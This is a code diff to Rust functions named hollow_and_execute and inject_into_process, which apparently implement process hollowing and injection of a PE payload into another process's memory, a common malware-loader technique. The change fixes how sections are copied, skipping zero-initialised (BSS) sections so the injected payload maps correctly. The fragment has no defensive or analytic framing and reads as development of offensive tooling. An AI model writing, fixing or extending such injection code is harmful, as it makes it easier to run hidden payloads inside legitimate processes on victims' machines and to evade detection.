@@ -266,7 +266,10 @@ pub fn hollow_and_execute(payload: &[u8]) -> Result<()> {
             let raw_sz = sec.SizeOfRawData as usize;
             let virt_sz = *sec.Misc.VirtualSize() as usize;
             let copy_sz = raw_sz.min(virt_sz);
-            if raw_off + copy_sz > payload.len() || copy_sz == 0 {
+            // Skip BSS / zero-initialised sections: PointerToRawData == 0 means
+            // there is no on-disk data for this section; the OS zero-fills it
+            // from the VirtualAlloc.  Also skip if the copy size is zero.
+            if raw_off == 0 || raw_sz == 0 || raw_off + copy_sz > payload.len() || copy_sz == 0 {
                 continue;
             }
             let dst = (remote_base + sec.VirtualAddress as usize) as *mut c_void;
@@ -578,7 +581,7 @@ pub fn inject_into_process(pid: u32, payload: &[u8]) -> Result<()> {
                 let raw_sz = sec.SizeOfRawData as usize;
                 let virt_sz = *sec.Misc.VirtualSize() as usize;
                 let copy_sz = raw_sz.min(virt_sz);
-                if raw_off + copy_sz > payload.len() || copy_sz == 0 {
+                if raw_off == 0 || raw_sz == 0 || raw_off + copy_sz > payload.len() || copy_sz == 0 {
                     continue;
                 }
                 let dst = (remote_base + sec.VirtualAddress as usize) as *mut c_void;
